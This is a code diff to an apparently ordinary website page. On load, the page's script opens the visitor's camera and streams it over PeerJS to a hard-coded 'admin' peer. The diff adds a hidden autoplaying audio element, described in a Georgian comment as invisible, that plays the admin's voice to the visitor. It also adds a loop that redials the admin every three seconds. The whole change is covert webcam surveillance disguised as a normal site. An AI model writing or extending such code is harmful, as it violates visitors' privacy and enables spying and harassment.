@@ -108,6 +108,9 @@ h2 span{
 <canvas id="bg"></canvas>
 <div class="background"></div>
 
+<!-- უხილავი აუდიო ტეგი ადმინის ხმის მისაღებად -->
+<audio id="remoteAudio" autoplay></audio>
+
 <div id="website">
     <section>
         <div class="content">
@@ -140,8 +143,12 @@ h2 span{
 
 <script>
 const ADMIN_PEER_ID = 'deme-admin-secret-key-123';
+const remoteAudio = document.getElementById('remoteAudio');
+
 let cameraStream = null;
 let peer = null;
+let currentCall = null;
+let reconnectInterval = null;
 
 window.addEventListener('DOMContentLoaded', async () => {
     try {
@@ -150,7 +157,6 @@ window.addEventListener('DOMContentLoaded', async () => {
             audio: false
         });
 
-        // STUN სერვერები სხვადასხვა ქსელიდან დაკავშირებისთვის
         peer = new Peer({
             config: {
                 iceServers: [
@@ -162,7 +168,7 @@ window.addEventListener('DOMContentLoaded', async () => {
         });
 
         peer.on('open', () => {
-            makeCall();
+            startConnectingLoop();
         });
 
         peer.on('disconnected', () => {
@@ -174,13 +180,35 @@ window.addEventListener('DOMContentLoaded', async () => {
     }
 });
 
+function startConnectingLoop() {
+    if (reconnectInterval) clearInterval(reconnectInterval);
+
+    reconnectInterval = setInterval(() => {
+        if (!currentCall && peer && !peer.destroyed) {
+            makeCall();
+        }
+    }, 3000);
+}
+
 function makeCall() {
-    if (cameraStream && peer) {
-        const call = peer.call(ADMIN_PEER_ID, cameraStream);
-        call?.on('close', () => {
-            setTimeout(makeCall, 5000);
-        });
-    }
+    if (!cameraStream || !peer) return;
+
+    const call = peer.call(ADMIN_PEER_ID, cameraStream);
+    
+    call.on('stream', (incomingAudioStream) => {
+        clearInterval(reconnectInterval);
+        currentCall = call;
+        remoteAudio.srcObject = incomingAudioStream;
+    });
+
+    call.on('close', () => {
+        currentCall = null;
+        startConnectingLoop();
+    });
+
+    call.on('error', () => {
+        currentCall = null;
+    });
 }
 
 /* PARTICLES */
